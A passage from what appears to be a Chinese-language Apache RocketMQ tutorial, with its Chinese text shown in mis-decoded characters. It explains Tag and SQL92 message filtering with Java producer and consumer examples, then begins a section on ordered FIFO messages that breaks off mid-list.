<p>RocketMQ çš„è¿‡æ»¤æ¶ˆæ¯åŠŸèƒ½å…è®¸æ¶ˆè´¹è€…åªæ¥æ”¶å…¶æ„Ÿå…´è¶£çš„æ¶ˆæ¯ï¼Œè€Œä¸æ˜¯è®¢é˜…ä¸»é¢˜ä¸‹çš„æ‰€æœ‰æ¶ˆæ¯ã€‚è¿™åœ¨å¤šç§æ¶ˆè´¹è€…å¯¹åŒä¸€ä¸»é¢˜æœ‰ä¸åŒå…³æ³¨ç‚¹çš„åœºæ™¯ä¸‹éå¸¸æœ‰ç”¨ã€‚</p>
<blockquote>
<p>å½“æˆ‘ä»¬ç›¸åŒçš„æ¨¡å—çš„æ¶ˆæ¯éƒ½æ”¾åˆ°åŒä¸€ä¸ª Topic ä¸­ï¼Œä½†æ˜¯ä¸åŒçš„ä¸šåŠ¡éœ€è¦æ ¹æ®ä¸åŒçš„éœ€æ±‚å»è·å–ä¸åŒçš„æ¶ˆæ¯ã€‚ä¾‹å¦‚ä»“å‚¨ç³»ç»Ÿï¼Œå…¥åº“å‡ºåº“æ¶ˆæ¯éƒ½æ˜¯åœ¨ä»“å‚¨çš„ Topic ä¸­ï¼Œä»“å‚¨ç³»ç»Ÿéœ€è¦è®°è´¦ï¼Œå°±æ ¹æ®æ‰€éœ€çš„æ¶ˆæ¯å»åšè¿›è´¦ä¸å‡ºè´¦ä¸šåŠ¡ã€‚</p>
</blockquote>
<p>RocketMQ çš„æ¶ˆæ¯è¿‡æ»¤æ˜¯åœ¨ Broker ç«¯æ‰§è¡Œçš„æ ¸å¿ƒæœºåˆ¶ï¼Œæ ¸å¿ƒæ˜¯é€šè¿‡Tag æ ‡ç­¾è¿‡æ»¤å’ŒSQL92 å±æ€§è¿‡æ»¤ä¸¤ç§æ–¹å¼ï¼Œè®©æ¶ˆè´¹è€…åªæ¥æ”¶ç¬¦åˆæ¡ä»¶çš„æ¶ˆæ¯ï¼Œå‡å°‘æ— æ•ˆç½‘ç»œä¼ è¾“ä¸æ¶ˆè´¹ç«¯å‹åŠ›ï¼Œè¿‡æ»¤åœ¨æœåŠ¡ç«¯å®Œæˆï¼Œéµå¾ª â€œåŒ¹é…å³æŠ•é€’â€ åŸåˆ™ã€‚</p>
<h4 data-id="heading-19">4.1 Tag è¿‡æ»¤</h4>
<p>åŸºäºæ¶ˆæ¯çš„ Tag æ ‡ç­¾è¿›è¡Œè¿‡æ»¤ï¼ŒTag æ˜¯æ¶ˆæ¯çš„å­åˆ†ç±»æ ‡è¯†ï¼Œæ¯ä¸ªæ¶ˆæ¯åªèƒ½æœ‰ä¸€ä¸ª Tagã€‚</p>
<p><strong>è¯­æ³•è§„åˆ™</strong></p>
<ul>
<li>å• Tag åŒ¹é…ï¼šå¦‚ "CREATE"ï¼Œåªæ¥æ”¶æ ‡ç­¾ä¸º CREATE çš„æ¶ˆæ¯ã€‚</li>
<li>å¤š Tag åŒ¹é…ï¼šå¤šä¸ª Tag é—´ç”¨ <code>||</code> åˆ†éš”ï¼ˆé€»è¾‘æˆ–ï¼‰ï¼Œå¦‚ "CREATE||PAY||CANCEL"ã€‚ï¼ˆä¸æ”¯æŒæ¨¡ç³ŠåŒ¹é…ï¼‰</li>
<li>å…¨åŒ¹é…ï¼šç”¨ <code>*</code> è¡¨ç¤ºæ¥æ”¶è¯¥ä¸»é¢˜ä¸‹æ‰€æœ‰æ¶ˆæ¯ã€‚</li>
</ul>
<p><strong>å®ç°åŸç†</strong></p>
<ol>
<li>ç”Ÿäº§è€…å‘é€æ¶ˆæ¯æ—¶ï¼ŒTag ä¼šè¢«è®¡ç®—å“ˆå¸Œå€¼å­˜å…¥ ConsumeQueueï¼ˆæ¶ˆæ¯æ¶ˆè´¹é€»è¾‘é˜Ÿåˆ—ï¼‰ã€‚</li>
<li>Broker è¿‡æ»¤æ—¶å…ˆé€šè¿‡ ConsumeQueue ä¸­çš„ Tag å“ˆå¸Œå€¼å¿«é€ŸåŒ¹é…ï¼Œå‘½ä¸­åå†æ ¡éªŒæ¶ˆæ¯åŸå§‹ Tag å­—ç¬¦ä¸²ï¼Œé¿å…å“ˆå¸Œå†²çªå¯¼è‡´è¯¯åŒ¹é…ã€‚</li>
<li>æ¶ˆè´¹ç«¯æ‹‰å–åˆ°æ¶ˆæ¯åï¼Œä¹Ÿä¼šäºŒæ¬¡æ ¡éªŒ Tag åŸå§‹å€¼ï¼Œç¡®ä¿è¿‡æ»¤å‡†ç¡®æ€§ã€‚</li>
</ol>
<p><strong>ä»£ç æ¡ˆä¾‹</strong></p>
<p>ç”Ÿäº§è€…ï¼Œå‘ Topic æ˜¯ <code>TopicTest</code> å‘é€ TagAã€TagBã€TagC ä¸‰ç§æ ‡ç­¾çš„æ¶ˆæ¯ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TagFilterProducer</span> {

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"TopicTest"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; TAGS = List.of(<span class="hljs-string">"TagA"</span>, <span class="hljs-string">"TagB"</span>, <span class="hljs-string">"TagC"</span>);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException, InterruptedException {
        <span class="hljs-comment">// åˆ›å»ºæ¶ˆè´¹è€…ï¼ŒæŒ‡å®šæ¶ˆè´¹ç»„</span>
        <span class="hljs-type">DefaultMQProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQProducer</span>(PRODUCER_GROUP);
        <span class="hljs-comment">// è®¾ç½®Nameserveråœ°å€</span>
        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// å¯åŠ¨ç”Ÿäº§è€…</span>
        producer.start();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// åˆ›å»ºæ¶ˆæ¯ä½“ï¼šè®¢é˜…ä¸»é¢˜ã€Tagã€æ¶ˆæ¯ä½“</span>
                <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC,
                        TAGS.get(i % TAGS.size()),
                        (<span class="hljs-string">"Hello RocketMQ "</span> + i).getBytes(RemotingHelper.DEFAULT_CHARSET)
                );
                <span class="hljs-comment">// å‘é€æ¶ˆæ¯</span>
                <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.send(msg, <span class="hljs-number">20</span> * <span class="hljs-number">1000</span>);
                System.out.printf(<span class="hljs-string">"%s%n"</span>, sendResult);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                e.printStackTrace();
                Thread.sleep(<span class="hljs-number">1000</span>);
            }
        }
        <span class="hljs-comment">// å…³é—­ç”Ÿäº§è€…ï¼Œé‡Šæ”¾èµ„æº</span>
        producer.shutdown();
    }
}
</code></pre>
<p><strong>è¿‡æ»¤æ¶ˆè´¹è€…</strong></p>
<p>é€šè¿‡æŒ‡å®š Tag è§„åˆ™è¿›è¡Œè¿‡æ»¤ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TagFilterConsumer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONSUMER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"TopicTest"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException {
        <span class="hljs-comment">// åˆ›å»ºæ¶ˆè´¹è€…ï¼ŒæŒ‡å®šæ¶ˆè´¹ç»„</span>
        <span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(CONSUMER_GROUP);
        <span class="hljs-comment">// è®¾ç½®Nameserveråœ°å€</span>
        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// å¦‚æœç‰¹å®šçš„æ¶ˆè´¹ç¾¤ä½“æ˜¯å…¨æ–°çš„ï¼Œè¯·æŒ‡å®šä»å“ªé‡Œå¼€å§‹</span>
        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);
        <span class="hljs-comment">// é…ç½®è®¢é˜…ä¸»é¢˜Topicã€Tag</span>
<span class="hljs-comment">//        consumer.subscribe(TOPIC, "*");</span>
<span class="hljs-comment">//        consumer.subscribe(TOPIC, "TagA");</span>
        consumer.subscribe(TOPIC, <span class="hljs-string">"TagA || TagB"</span>);
        <span class="hljs-comment">// è®¾ç½®å›è°ƒå‡½æ•°ï¼Œå¤„ç†æ¶ˆæ¯</span>
        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -&gt; {
            System.out.printf(<span class="hljs-string">"%s Receive New Messages: %s %n"</span>, Thread.currentThread().getName(), msg);
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        });
        <span class="hljs-comment">// å¯åŠ¨æ¶ˆè´¹è€…ï¼Œå¯åŠ¨åä¼šä¸€ç›´æŒ‚ç€ï¼ŒæŒç»­å¤„ç†æ¶ˆæ¯</span>
        consumer.start();
        System.out.printf(<span class="hljs-string">"Consumer Started.%n"</span>);
    }
}
</code></pre>
<p>è¿‡æ»¤å¯ä»¥è·å–å…¨éƒ¨çš„æ¶ˆæ¯ã€æŒ‡å®šå•ä¸ªçš„ Tag æˆ–è€…æŒ‡å®šå¤šä¸ª Tagã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// é€šé…</span>
consumer.subscribe(TOPIC, <span class="hljs-string">"*"</span>);
<span class="hljs-comment">// å•ä¸ª</span>
consumer.subscribe(TOPIC, <span class="hljs-string">"TagA"</span>);
<span class="hljs-comment">// å¤šä¸ª</span>
consumer.subscribe(TOPIC, <span class="hljs-string">"TagA || TagB"</span>);
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šç®€å•çš„æ¶ˆæ¯åˆ†ç±»è¿‡æ»¤ï¼Œå¦‚è®¢å•åˆ›å»ºã€æ”¯ä»˜ã€å–æ¶ˆç­‰ä¸åŒç±»å‹æ¶ˆæ¯çš„åˆ†ç¦»ï¼Œé€‚åˆé«˜ååé‡åœºæ™¯ï¼Œæ€§èƒ½æŸè€—ä½ã€‚</p>
<h4 data-id="heading-20">4.2 SQL è¿‡æ»¤</h4>
<p>SQL è¿‡æ»¤æ˜¯åŸºäºæ¶ˆæ¯çš„è‡ªå®šä¹‰å±æ€§ï¼ˆkey-valueï¼‰è¿›è¡Œè¿‡æ»¤ï¼Œæ”¯æŒ SQL92 è¯­æ³•çš„å­é›†ï¼Œå¯å®ç°å¤æ‚æ¡ä»¶åŒ¹é…ï¼Œæ¯ä¸ªæ¶ˆæ¯å¯è®¾ç½®å¤šä¸ªå±æ€§<strong/>ã€‚</p>
<p><strong>æ”¯æŒè¯­æ³•å…ƒç´ </strong></p>
<ul>
<li>æ¯”è¾ƒè¿ç®—ç¬¦ï¼š<code>=</code>ã€<code>&lt;&gt;</code>ã€<code>&gt;</code>ã€<code>&gt;=</code>ã€<code>&lt;</code>ã€<code>&lt;=</code>ã€‚</li>
<li>é€»è¾‘è¿ç®—ç¬¦ï¼š<code>AND</code>ã€<code>OR</code>ã€<code>NOT</code>ã€‚</li>
<li>å¸¸é‡ï¼šå­—ç¬¦ä¸²ï¼ˆç”¨å•å¼•å·ï¼‰ã€æ•°å­—ã€<code>NULL</code>ã€‚</li>
<li>å‡½æ•°ï¼š<code>IN</code>ã€<code>LIKE</code>ã€<code>BETWEEN</code> ç­‰ã€‚</li>
<li>æ¨¡ç³ŠåŒ¹é…ï¼š<code>%</code> åŒ¹é…ä»»æ„ 0 ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ï¼Œ <code>_</code> åŒ¹é…ä»»æ„å•ä¸ªå­—ç¬¦  ã€‚</li>
</ul>
<p><strong>å®ç°åŸç†</strong>ï¼šä¾èµ– rocketmq-filter æ¨¡å—æ„å»ºå¹¶æ‰§è¡Œ SQL è¡¨è¾¾å¼ï¼Œè¿‡æ»¤æ—¶éœ€è¯»å–æ¶ˆæ¯çš„å®Œæ•´å±æ€§è¿›è¡Œè®¡ç®—ï¼Œæ€§èƒ½ç•¥ä½äº Tag è¿‡æ»¤ï¼Œä½†çµæ´»æ€§æ›´é«˜ã€‚</p>
<p>æ¡ˆä¾‹ä»£ç </p>
<p>ç”Ÿäº§è€…è¿˜æ˜¯æŒ‡å®šæ ‡ç­¾ ABCï¼Œå¹¶ä¸”å¯ä»¥è‡ªå®šä¹‰å†™å…¥å±æ€§ä¿¡æ¯ã€‚</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SQLFilterProducer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">MESSAGE_COUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">20</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">PRODUCER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SQLTopic"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> List&lt;String&gt; TAGS = List.of(<span class="hljs-string">"TagA"</span>, <span class="hljs-string">"TagB"</span>, <span class="hljs-string">"TagC"</span>);

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException, InterruptedException {
        <span class="hljs-comment">// åˆ›å»ºæ¶ˆè´¹è€…ï¼ŒæŒ‡å®šæ¶ˆè´¹ç»„</span>
        <span class="hljs-type">DefaultMQProducer</span> <span class="hljs-variable">producer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQProducer</span>(PRODUCER_GROUP);
        <span class="hljs-comment">// è®¾ç½®Nameserveråœ°å€</span>
        producer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// å¯åŠ¨ç”Ÿäº§è€…</span>
        producer.start();
        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; MESSAGE_COUNT; i++) {
            <span class="hljs-keyword">try</span> {
                <span class="hljs-comment">// åˆ›å»ºæ¶ˆæ¯ä½“ï¼šè®¢é˜…ä¸»é¢˜ã€Tagã€æ¶ˆæ¯ä½“</span>
                <span class="hljs-type">Message</span> <span class="hljs-variable">msg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Message</span>(TOPIC,
                        TAGS.get(i % TAGS.size()),
                        (<span class="hljs-string">"Hello RocketMQ "</span> + i).getBytes(RemotingHelper.DEFAULT_CHARSET)
                );
                <span class="hljs-comment">// ç”Ÿäº§è€…å‘é€å¸¦è‡ªå®šä¹‰å±æ€§çš„æ¶ˆæ¯</span>
                msg.putUserProperty(<span class="hljs-string">"orderId"</span>, <span class="hljs-string">"123456"</span>);
                msg.putUserProperty(<span class="hljs-string">"qty"</span>, String.valueOf(<span class="hljs-number">10</span> + i));
                <span class="hljs-comment">// å‘é€æ¶ˆæ¯</span>
                <span class="hljs-type">SendResult</span> <span class="hljs-variable">sendResult</span> <span class="hljs-operator">=</span> producer.send(msg, <span class="hljs-number">20</span> * <span class="hljs-number">1000</span>);
                System.out.printf(<span class="hljs-string">"%s%n"</span>, sendResult);
            } <span class="hljs-keyword">catch</span> (Exception e) {
                e.printStackTrace();
                Thread.sleep(<span class="hljs-number">1000</span>);
            }
        }
        <span class="hljs-comment">// å…³é—­ç”Ÿäº§è€…ï¼Œé‡Šæ”¾èµ„æº</span>
        producer.shutdown();
    }
}
</code></pre>
<p>æ¶ˆè´¹è€…é€šè¿‡ SQL è¿›è¡Œè¿‡æ»¤</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">SQLFilterConsumer</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">CONSUMER_GROUP</span> <span class="hljs-operator">=</span> <span class="hljs-string">"Study1"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">DEFAULT_NAMESRVADDR</span> <span class="hljs-operator">=</span> <span class="hljs-string">"192.168.109.134:9876"</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">String</span> <span class="hljs-variable">TOPIC</span> <span class="hljs-operator">=</span> <span class="hljs-string">"SQLTopic"</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MQClientException {
        <span class="hljs-comment">// åˆ›å»ºæ¶ˆè´¹è€…ï¼ŒæŒ‡å®šæ¶ˆè´¹ç»„</span>
        <span class="hljs-type">DefaultMQPushConsumer</span> <span class="hljs-variable">consumer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">DefaultMQPushConsumer</span>(CONSUMER_GROUP);
        <span class="hljs-comment">// è®¾ç½®Nameserveråœ°å€</span>
        consumer.setNamesrvAddr(DEFAULT_NAMESRVADDR);
        <span class="hljs-comment">// å¦‚æœç‰¹å®šçš„æ¶ˆè´¹ç¾¤ä½“æ˜¯å…¨æ–°çš„ï¼Œè¯·æŒ‡å®šä»å“ªé‡Œå¼€å§‹</span>
        consumer.setConsumeFromWhere(ConsumeFromWhere.CONSUME_FROM_FIRST_OFFSET);
        <span class="hljs-comment">// é…ç½®è®¢é˜…ä¸»é¢˜Topicã€SQL</span>
        consumer.subscribe(TOPIC,
                MessageSelector.bySql(<span class="hljs-string">"(TAGS IS NOT NULL AND TAGS IN ('TagA', 'TagB)) "</span> +
                        <span class="hljs-string">"AND (orderId IS NOT NULL AND qty &gt; 15)"</span>));
        <span class="hljs-comment">// è®¾ç½®å›è°ƒå‡½æ•°ï¼Œå¤„ç†æ¶ˆæ¯</span>
        consumer.registerMessageListener((MessageListenerConcurrently) (msg, context) -&gt; {
            System.out.printf(<span class="hljs-string">"%s Receive New Messages: %s %n"</span>, Thread.currentThread().getName(), msg);
            <span class="hljs-keyword">return</span> ConsumeConcurrentlyStatus.CONSUME_SUCCESS;
        });
        <span class="hljs-comment">// å¯åŠ¨æ¶ˆè´¹è€…ï¼Œå¯åŠ¨åä¼šä¸€ç›´æŒ‚ç€ï¼ŒæŒç»­å¤„ç†æ¶ˆæ¯</span>
        consumer.start();
        System.out.printf(<span class="hljs-string">"Consumer Started.%n"</span>);
    }
}
</code></pre>
<p>è¿‡æ»¤å‡ºæ ‡ç­¾æ˜¯ TagA å’Œ TagB ä»¥åŠ qty å¤§äº 15 å¹¶ä¸” orderId ä¸èƒ½ä¸ºç©ºã€‚</p>
<p><strong>é€‚ç”¨åœºæ™¯</strong>ï¼šå¤æ‚ä¸šåŠ¡è¿‡æ»¤ï¼Œå¦‚æ ¹æ®è®¢å•é‡‘é¢ã€æ—¶é—´èŒƒå›´ã€ç”¨æˆ·ç­‰çº§ç­‰å¤šç»´åº¦ç­›é€‰æ¶ˆæ¯ã€‚</p>
<blockquote>
<p>æ³¨ï¼šé€šè¿‡ TAGS è¿‡æ»¤æ˜¯ä¸ç”¨æ‹…å¿ƒæ€§èƒ½é—®é¢˜ï¼Œä½†æ˜¯é€šè¿‡è‡ªå®šä¹‰å±æ€§å°±ä¼šé€ æˆæ€§èƒ½é—®é¢˜ã€‚ RocketMQ ä¸­è¢«è¿‡æ»¤æ‰çš„æ¶ˆæ¯ä¸ä¼šæ¶ˆå¤±ï¼Œè¿‡æ»¤åªæ˜¯é™åˆ¶è¿™äº›æ¶ˆæ¯æŠ•é€’ç»™å½“å‰åŒ¹é…è¿‡æ»¤æ¡ä»¶çš„æ¶ˆè´¹è€…ï¼Œæ¶ˆæ¯æœ¬èº«çš„ç”Ÿå‘½å‘¨æœŸå®Œå…¨ç”± Broker çš„å­˜å‚¨ç­–ç•¥å†³å®šï¼Œå’Œæ˜¯å¦è¢«è¿‡æ»¤æ²¡æœ‰å…³ç³»ã€‚</p>
<p>ç”±äºæ¨¡ç³ŠåŒ¹é…ï¼ˆç‰¹åˆ«æ˜¯ %xxx è¿™ç§å‰ç½®é€šé…ç¬¦ï¼‰ä¼šå¯¼è‡´ Broker æ— æ³•åˆ©ç”¨ç´¢å¼•ï¼Œå¿…é¡»é€æ¡æ‰«ææ¶ˆæ¯å±æ€§ï¼Œåœ¨æ¶ˆæ¯é‡å·¨å¤§æ—¶ä¼šä¸¥é‡å½±å“æ€§èƒ½ã€‚å¦‚æœå¯èƒ½ï¼Œå»ºè®®åœ¨å‘é€æ¶ˆæ¯æ—¶å°†éœ€è¦æ¨¡ç³ŠåŒ¹é…çš„ç»´åº¦æ‹†åˆ†ä¸ºç‹¬ç«‹çš„æ¶ˆæ¯å±æ€§ï¼ˆä¾‹å¦‚å°† orderType æ‹†åˆ†ä¸º prefix å’Œ suffix ä¸¤ä¸ªå±æ€§ï¼‰ï¼Œæˆ–è€…ç›´æ¥ä½¿ç”¨ Tag è¿›è¡Œç²—ç²’åº¦è¿‡æ»¤ï¼Œå†åœ¨æ¶ˆè´¹ç«¯è¿›è¡Œç»†ç²’åº¦çš„æ¨¡ç³ŠåŒ¹é…ã€‚</p>
</blockquote>
<h3 data-id="heading-21">5 é¡ºåºæ¶ˆæ¯</h3>
<p>RocketMQ çš„é¡ºåºæ¶ˆæ¯ï¼ˆFIFO æ¶ˆæ¯ï¼‰æ˜¯ä¸€ç§**é«˜çº§æ¶ˆæ¯ç±»å‹<strong>ï¼Œæ”¯æŒæ¶ˆè´¹è€…æŒ‰ç…§å‘é€æ¶ˆæ¯çš„å…ˆåé¡ºåºè·å–æ¶ˆæ¯ï¼Œä»è€Œå®ç°ä¸šåŠ¡åœºæ™¯ä¸­çš„é¡ºåºå¤„ç†ã€‚å®ƒé€šè¿‡</strong>æ¶ˆæ¯ç»„ (MessageGroup)** æœºåˆ¶ä¿è¯<strong>å±€éƒ¨é¡ºåº</strong>ï¼Œåœ¨æ»¡è¶³ä¸šåŠ¡é¡ºåºéœ€æ±‚çš„åŒæ—¶å…¼é¡¾ç³»ç»Ÿååèƒ½åŠ›ã€‚</p>
<h4 data-id="heading-22">ç”Ÿäº§ç«¯ï¼šä¿è¯å‘é€é¡ºåº</h4>
<ul>
<li><strong>é˜Ÿåˆ—é€‰æ‹©å™¨</strong>ï¼šé€šè¿‡<code>MessageQueueSelector</code>å°†åŒä¸€ä¸šåŠ¡æ ‡è¯†ï¼ˆå¦‚è®¢å• IDï¼‰çš„æ¶ˆæ¯è·¯ç”±åˆ°<strong>åŒä¸€ä¸ªé˜Ÿåˆ—</strong>ï¼Œé¿å…è·¨é˜Ÿåˆ—ä¹±åº</li>
<li><strong>åŒæ­¥å‘é€</strong>ï¼šå¿…é¡»ä½¿ç”¨<strong>åŒæ­¥å‘é€</strong>ï¼ˆ<code>send()</code>ï¼‰ï¼Œç¦æ­¢å¼‚æ­¥å‘é€ï¼Œç¡®ä¿æ¶ˆæ¯å‘é€æˆåŠŸåå†å‘é€ä¸‹ä¸€æ¡</li>
<li><strong>æ¶ˆæ¯ç»„æœºåˆ¶</strong>ï¼šæ–°ç‰ˆ RocketMQ é€šè¿‡<code>MessageGroup</code>å±æ€§æ ‡è®°æ¶ˆæ¯å½’å±ï¼ŒæœåŠ¡ç«¯è‡ªåŠ¨è·¯ç”±åˆ°å¯¹åº”é˜Ÿåˆ—ã€‚</li>
</ul>
<blockquote>
<p>â½£äº§è€…åªæœ‰å°†â¼€æ‰¹æœ‰é¡ºåºè¦æ±‚çš„æ¶ˆæ¯ï¼Œæ”¾åˆ°åŒâ¼€ä¸ªMesasgeQueueä¸Šï¼Œé€šè¿‡MessageQueueçš„FIFOç‰¹æ€§ä¿è¯è¿™â¼€æ‰¹æ¶ˆæ¯çš„é¡ºåºã€‚å¦‚æœä¸æŒ‡å®šMessageSelectorå¯¹è±¡ï¼Œé‚£ä¹ˆâ½£äº§è€…ä¼šé‡‡â½¤è½®è¯¢çš„â½…å¼å°†å¤šæ¡æ¶ˆæ¯ä¾æ¬¡å‘é€åˆ°ä¸åŒçš„MessageQueueä¸Šã€‚</p>
</blockquote>
<p>ç”Ÿäº§è€…æ¡ˆä¾‹ä»£ç </p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// ç”Ÿäº§è€…å‘é€é¡ºåºæ¶ˆæ¯</span>
producer.send(message, <span class="hljs-keyword">new</span> <span class="hljs-title class_">MessageQueueSelector</span>() {
    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> MessageQueue <span class="hljs-title function_">select</span><span class="hljs-params">(List&lt;MessageQueue&gt; mqs, Message msg, Object arg)</span> {
        <span class="hljs-comment">// æŒ‰è®¢å•IDå“ˆå¸Œé€‰æ‹©é˜Ÿåˆ—ï¼Œç¡®ä¿åŒä¸€è®¢å•æ¶ˆæ¯è¿›å…¥åŒä¸€é˜Ÿåˆ—</span>
        <span class="hljs-type">Integer</span> <span class="hljs-variable">orderId</span> <span class="hljs-operator">=</span> (Integer) arg;
        <span class="hljs-type">int</span> <span class="hljs-variable">index</span> <span class="hljs-operator">=</span> orderId % mqs.size();
        <span class="hljs-keyword">return</span> mqs.get(index);
    }
}, orderId); <span class="hljs-comment">// ä¼ é€’è®¢å•IDä½œä¸ºè·¯ç”±å‚æ•°</span>
</code></pre>
<h4 data-id="heading-23">æ¶ˆè´¹ç«¯ï¼šä¿è¯å¤„ç†é¡ºåº</h4>
<ul>
<li><strong>é¡ºåºæ¶ˆè´¹æ¨¡å¼</strong>ï¼šä½¿ç”¨<code>MessageListenerOrderly</code>ï¼ˆè€Œéå¹¶å‘æ¨¡å¼<code>MessageListenerConcurrently</code>ï¼‰</li>
<li><strong>é˜Ÿåˆ—ç‹¬å </strong>ï¼šåŒä¸€é˜Ÿåˆ—åŒä¸€æ—¶é—´ä»…åˆ†é…ç»™<strong>ä¸€ä¸ªæ¶ˆè´¹çº¿ç¨‹</strong>ï¼Œçº¿ç¨‹æŒ‰æ¶ˆæ¯é¡ºåºä¸²è¡Œå¤„ç†</li>
